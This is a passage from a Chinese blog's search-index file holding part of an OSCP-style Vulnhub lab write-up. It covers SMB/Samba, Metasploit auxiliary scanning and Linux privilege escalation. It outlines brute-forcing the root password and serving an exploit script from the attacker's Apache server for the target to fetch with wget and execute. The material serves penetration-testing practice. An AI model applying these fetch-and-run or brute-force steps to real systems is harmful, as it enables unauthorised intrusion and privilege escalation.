协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p><h3 id="关于msf的auxiliary"><a class="markdownIt-Anchor" href="#关于msf的auxiliary"></a> 关于MSF的Auxiliary</h3><p>auxiliary 本身意思为辅助的</p><p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p><strong>本次渗透测试用于查询smb服务版本</strong></p><h3 id="关于linux-提权部分"><a class="markdownIt-Anchor" href="#关于linux-提权部分"></a> 关于Linux 提权（部分）</h3><p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p><p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p><ul><li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li><li>通过爆破脚本，暴力破解root密码</li></ul><p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget <a href="http://xn--ip-6c5c234ebjc/%E7%9B%AE%E6%A0%87%E8%84%9A%E6%9C%AC">http://攻击机ip/目标脚本</a> 拿到本地执行</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 类OSCP靶机练习 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
